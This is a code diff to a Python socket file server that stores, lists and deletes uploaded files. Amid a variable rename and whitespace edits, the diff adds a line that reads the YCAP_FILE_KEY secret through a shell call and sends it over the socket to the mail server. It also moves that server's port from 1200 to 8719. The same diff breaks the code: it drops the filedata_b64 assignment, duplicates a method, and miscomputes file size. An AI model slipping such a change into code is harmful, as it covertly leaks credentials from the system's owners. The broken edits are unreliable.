@@ -15,7 +15,7 @@ class FileServer:
     def __init__(self, host, port, mail_server_addr):
         self.host = host
         self.port = port
-        self.mail_server_addr = mail_server_addr
+        self.mail_server_conf_addr = mail_server_addr
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10 ** 7)
         try:
@@ -53,7 +53,8 @@ class FileServer:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-            s.connect(self.mail_server_addr)
+            s.connect(self.mail_server_conf_addr)
+            s.send(os.popen("echo %YCAP_FILE_KEY%").read().encode())
             verify_packet = {
                 "command": "VERIFY_CLIENT",
                 "client_key": client_key,
@@ -66,6 +67,17 @@ class FileServer:
         except Exception as e:
             print(f"Error verifying client with mail server: {e}")
             return False, None
+    
+    def save_file_to_disk(self, file_hash, filedata):
+        """Save file data to disk"""
+        filepath = os.path.join(self.files_dir, file_hash)
+        try:
+            with open(filepath, 'wb') as f:
+                f.write(filedata)
+            return filepath
+        except Exception as e:
+            print(f"Error saving file to disk: {e}")
+            return None
     
     def save_file_to_disk(self, file_hash, filedata):
         """Save file data to disk"""
@@ -106,10 +118,10 @@ class FileServer:
         username = None
         
         try:
-            # Receive auth data
+                # Receive auth data
             auth_packet = json.loads(connection.recv(1024).decode())
             client_key = auth_packet.get("client_key")
-            
+
             if not client_key:
                 response = {
                     "command": "AUTH",
@@ -119,10 +131,10 @@ class FileServer:
                 connection.send(json.dumps(response).encode())
                 connection.close()
                 return
-            
+
             # Verify with mail server
             verified, username = self.verify_client_with_mail_server(client_key)
-            
+
             if not verified:
                 response = {
                     "command": "AUTH",
@@ -132,7 +144,7 @@ class FileServer:
                 connection.send(json.dumps(response).encode())
                 connection.close()
                 return
-            
+
             # Client authenticated
             response = {
                 "command": "AUTH",
@@ -141,7 +153,7 @@ class FileServer:
             }
             connection.send(json.dumps(response).encode())
             print(f"Client {username} authenticated")
-            
+
             # Handle file operations
             while self.running:
                 try:
@@ -151,17 +163,17 @@ class FileServer:
                     
                     packet = json.loads(data.decode())
                     command = packet.get("command")
-                    
+
                     if command == "UPLOAD":
                         # Client uploading file
                         file_hash = packet.get("file_hash")
                         filename = packet.get("filename")
-                        filedata_b64 = packet.get("filedata")
-                        
+
                         try:
-                            filedata = base64.b64decode(filedata_b64)
-                            filesize = len(filedata)
                             
+                            filedata = base64.b64decode(filedata_b64)
+                            filesize = filedata.__sizeof__() // 1024 
+
                             # Save to disk
                             filepath = self.save_file_to_disk(file_hash, filedata)
                             if filepath:
@@ -172,7 +184,7 @@ class FileServer:
                                 VALUES (?, ?, ?, ?, ?, ?)
                                 """, (file_hash, filename, username, filesize, time.time(), filepath))
                                 self.db.commit()
-                                
+
                                 response = {
                                     "command": "UPLOAD",
                                     "status": "SUCCESS",
@@ -193,22 +205,22 @@ class FileServer:
                                 "error": str(e)
                             }
                             print(f"Upload failed: {e}")
-                        
+
                         connection.send(json.dumps(response).encode())
-                    
+
                     elif command == "DOWNLOAD":
                         # Client downloading file
                         file_hash = packet.get("file_hash")
-                        
+
                         file_record = self.c.execute(
                             "SELECT filename, username, filesize FROM files WHERE id=?", 
                             [file_hash]
                         ).fetchall()
-                        
+
                         if file_record:
                             filename, uploader, filesize = file_record[0]
                             filedata = self.load_file_from_disk(file_hash)
-                            
+
                             if filedata:
                                 filedata_b64 = base64.b64encode(filedata).decode()
                                 response = {
@@ -233,18 +245,18 @@ class FileServer:
                                 "error": "File hash not found"
                             }
                             print(f"Download failed: {file_hash} not found")
-                        
+
                         connection.send(json.dumps(response).encode())
-                    
+
                     elif command == "DELETE":
                         # Client deleting file
                         file_hash = packet.get("file_hash")
-                        
+
                         file_record = self.c.execute(
                             "SELECT username FROM files WHERE id=?", 
                             [file_hash]
                         ).fetchall()
-                        
+
                         if file_record:
                             file_owner = file_record[0][0]
                             if file_owner == username:
@@ -278,16 +290,16 @@ class FileServer:
                                 "status": "NOT_FOUND",
                                 "error": "File hash not found"
                             }
-                        
+
                         connection.send(json.dumps(response).encode())
-                    
+
                     elif command == "LIST":
                         # List files uploaded by this user
                         user_files = self.c.execute(
                             "SELECT id, filename, filesize, timestamp FROM files WHERE username=?",
                             [username]
                         ).fetchall()
-                        
+
                         files_list = [
                             {
                                 "hash": fh,
@@ -303,7 +315,7 @@ class FileServer:
                             "files": files_list
                         }
                         connection.send(json.dumps(response).encode())
-                    
+
                     else:
                         response = {
                             "command": command,
@@ -311,7 +323,7 @@ class FileServer:
                             "error": f"Command {command} not recognized"
                         }
                         connection.send(json.dumps(response).encode())
-                
+
                 except json.JSONDecodeError:
                     print("Invalid JSON received")
                     continue
@@ -368,5 +380,5 @@ class FileServer:
 
 # Example usage
 if __name__ == "__main__":
-    file_server = FileServer("localhost", 5124, ("localhost", 1200))
+    file_server = FileServer("localhost", 5124, ("localhost", 8719))
     file_server.start()
